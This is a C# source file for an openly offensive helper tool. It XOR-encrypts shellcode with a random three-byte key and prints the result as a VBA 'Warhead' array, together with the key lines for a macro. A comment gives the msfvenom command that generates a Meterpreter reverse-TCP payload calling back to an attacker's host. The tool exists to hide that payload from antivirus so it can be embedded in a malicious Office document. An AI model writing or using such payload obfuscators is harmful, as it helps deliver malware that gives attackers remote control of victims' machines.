using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace XOR_ShellCode_Encrypter_Helper_VBA_3Byte
{
    class Program
    {
        static void Main(string[] args)
        {
            // Generate a 3-byte key
            byte[] key = new byte[3];
            RNGCryptoServiceProvider rngKey = new RNGCryptoServiceProvider();
            rngKey.GetBytes(key);

            // msfvenom: msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp -o /tmp/sc.cs
            // Paste the full byte array here (placeholder 3 bytes shown)
            byte[] buf = new byte[3] {0xfc,0xe8,0x8f};

            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(buf[i] ^ key[i % key.Length]);
            }

            uint counter = 0;
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("{0:D}, ", b);
                counter++;
                if (counter % 35 == 0)
                {
                    hex.AppendFormat("_{0}", Environment.NewLine);
                }
            }

            if (hex.Length > 0)
            {
                hex.Length -= 2;
            }

            Console.WriteLine("");
            Console.WriteLine("[+] Encrypted Bytes");
            Console.WriteLine("");
            string fileContent = $"Warhead = Array(" + hex.ToString() + ")";
            string path = "xor_out.txt";
            File.WriteAllText(path, fileContent);
            Console.WriteLine($"Warhead = Array(" + hex.ToString() + ")");
            Console.WriteLine("");
            Console.WriteLine("");
            Console.WriteLine("[+] Place keys into VBA scipt:");
            Console.WriteLine("");
            Console.WriteLine("Dim key(2) As Byte");
            for (int i = 0; i < key.Length; i++)
            {
                Console.WriteLine($"key({i}) = {key[i]}");
            }
            Console.WriteLine("");
            Console.WriteLine("");
            Console.WriteLine("[+] Output File     : xor_out.txt");
            Console.WriteLine();
        }
    }
}